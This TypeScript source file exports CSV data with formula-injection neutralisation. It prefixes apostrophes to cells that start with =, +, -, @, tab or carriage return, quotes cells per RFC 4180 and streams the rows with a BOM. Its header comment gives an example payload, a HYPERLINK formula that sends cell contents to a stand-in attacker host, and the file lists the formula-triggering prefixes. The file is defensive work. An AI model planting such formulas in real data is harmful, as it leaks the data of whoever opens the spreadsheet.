/**
 * CSV export with formula-injection neutralisation.
 *
 * docs/06: "On export, any cell starting with an equals, plus, minus, at, tab
 * or CR is prefixed with an apostrophe. On import such values are stored as-is
 * but flagged, never evaluated."
 *
 * The attack: a contact's first name is set to
 * `=HYPERLINK("https://evil.test?"&A1,"Click")`, someone exports their
 * audience and opens it in Excel, and the spreadsheet executes it. The
 * exporting workspace is the victim and the data is their own. Quoting alone
 * does not help — Excel evaluates the cell after parsing the CSV, so the
 * neutralisation has to change the value, not its encoding.
 */

/**
 * Characters that make a spreadsheet treat a cell as a formula.
 *
 * Tab and carriage return are in the list because Excel strips leading
 * whitespace before deciding, so a value beginning "\t=cmd" is still a
 * formula. docs/06 names all six; BUILD-PLAN names the first four.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * True when a spreadsheet would treat this value as a formula.
 *
 * Exported so the import path can flag the same values rather than
 * reimplementing the rule with a different answer.
 */
export function looksLikeFormula(value: string): boolean {
  return FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix));
}

/**
 * Neutralises a single cell value.
 *
 * A leading apostrophe is how spreadsheets are told "this is text". It is
 * consumed on display, so the user sees the original value; it survives in the
 * file, which is where it matters.
 *
 * Note this deliberately also catches legitimate values: a phone number stored
 * as "+971..." gets an apostrophe. That is the correct trade. A phone number
 * displayed identically is a cosmetic cost; a formula that runs is a breach.
 */
export function neutraliseCell(value: string): string {
  return looksLikeFormula(value) ? `'${value}` : value;
}

/**
 * Renders one cell: neutralised, then quoted if the CSV grammar needs it.
 *
 * Order matters. Neutralising after quoting would put the apostrophe outside
 * the quotes, where a spreadsheet ignores it.
 */
export function formatCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  const text =
    value instanceof Date
      ? value.toISOString()
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value);

  const neutralised = neutraliseCell(text);

  // Quote when the value contains a delimiter, a quote or a line break.
  // Embedded quotes are doubled, per RFC 4180.
  return /[",\r\n]/u.test(neutralised)
    ? `"${neutralised.replaceAll('"', '""')}"`
    : neutralised;
}

export function formatRow(values: readonly unknown[]): string {
  return values.map(formatCell).join(',');
}

/**
 * Streams a CSV as an async iterable of lines, so exporting a large audience
 * does not build the whole file in memory.
 *
 * A BOM is emitted first: without it Excel on Windows reads UTF-8 as the
 * system codepage and mangles every non-ASCII name in the file.
 */
export async function* toCsvLines<T>(
  columns: readonly { header: string; value: (row: T) => unknown }[],
  rows: AsyncIterable<T> | Iterable<T>,
  options: { bom?: boolean } = {},
): AsyncGenerator<string> {
  const bom = options.bom ?? true;
  yield `${bom ? '﻿' : ''}${formatRow(columns.map((column) => column.header))}\r\n`;

  for await (const row of rows) {
    yield `${formatRow(columns.map((column) => column.value(row)))}\r\n`;
  }
}
